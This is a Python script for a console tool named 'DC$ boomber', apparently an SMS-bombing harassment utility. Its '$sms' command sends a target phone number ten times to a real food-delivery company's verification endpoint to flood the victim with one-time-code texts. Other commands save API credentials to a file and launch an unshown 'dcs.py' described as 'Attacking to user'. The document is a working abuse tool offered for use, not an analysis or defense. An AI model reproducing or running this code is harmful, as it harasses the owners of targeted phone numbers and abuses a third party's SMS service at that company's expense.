import os
from termcolor import colored
from colorama import init
import requests

init()

green = "green"
cyan = "cyan"
red = "red"
magenta = "magenta"
white = "white"

print(colored("===", magenta), colored("DC$ boomber ", cyan), colored("===", magenta))
print()
print(colored("[ !api :: $reg   ]", red), colored("Api registering", green))
print(colored("[ $st :: $attack ]", red), colored("Attacking to user", green))
print(colored("[ $sms <number>  ]", red), colored("SMS [boomber]", green))
print(colored("[ $cl :pl        ]", red), colored("Clear for linux/termux", green))
print(colored("[ $cl            ]", red), colored("Clear for Wind", green))
print()
print(colored("===", magenta), colored("by yd v23.5 ", cyan), colored("===", magenta))
print()

while 1: 
    command_is = input(colored(">$ ", "red"))
    if command_is == '!api :: $reg':
        id = input(colored(">$ Your id: ", "red"))
        api = input(colored(">$ Your api: ", "red"))
        with open("data.py", "w") as f:
            f.write(f"api_id = {id}\napi_hash = '{api}'")
        print(colored("Successfully!", "magenta"))

    elif command_is.startswith("$sms "): #5
        for sms in range(10):  
            a = requests.post("https://io.bellissimo.uz/api/verify-web",
                            data = {"phone" : command_is[5:]},)
            print(colored(a, "red"))

    elif command_is == "$st :: $attack":
        print(colored("Amaterasu!", cyan), colored("==", magenta))
        os.system('python dcs.py')

    elif command_is == "$st :: $attack :pl": # parameter linux -> pl
        print(colored("Amaterasu!", cyan), colored("==", magenta))
        os.system('python3 dcs.py')

    elif command_is == "$cl :pl": # parameter linux/termux -> pl
        os.system('clear')
        print(colored("===", magenta), colored("DC$ boomber ", cyan), colored("===", magenta))
        print()
        print(colored("[ !api :: $reg   ]", red), colored("Api registering", green))
        print(colored("[ $st :: $attack ]", red), colored("Attacking to user", green))
        print(colored("[ $sms <number>  ]", red), colored("SMS [boomber]", green))
        print(colored("[ $cl :pl        ]", red), colored("Clear for linux/termux", green))
        print(colored("[ $cl            ]", red), colored("Clear for Wind", green))
        print()
        print(colored("===", magenta), colored("by yd v23.5 ", cyan), colored("===", magenta))
        print()

    elif command_is == "$cl": # parameter windows
        os.system('cls')
        print(colored("===", magenta), colored("DC$ boomber ", cyan), colored("===", magenta))
        print(colored("===", magenta), colored("DC$ boomber ", cyan), colored("===", magenta))
        print()
        print(colored("[ !api :: $reg   ]", red), colored("Api registering", green))
        print(colored("[ $st :: $attack ]", red), colored("Attacking to user", green))
        print(colored("[ $sms <number>  ]", red), colored("SMS [boomber]", green))
        print(colored("[ $cl :pl        ]", red), colored("Clear for linux/termux", green))
        print(colored("[ $cl            ]", red), colored("Clear for Wind", green))
        print()
        print(colored("===", magenta), colored("by yd v23.5 ", cyan), colored("===", magenta))
        print()

        
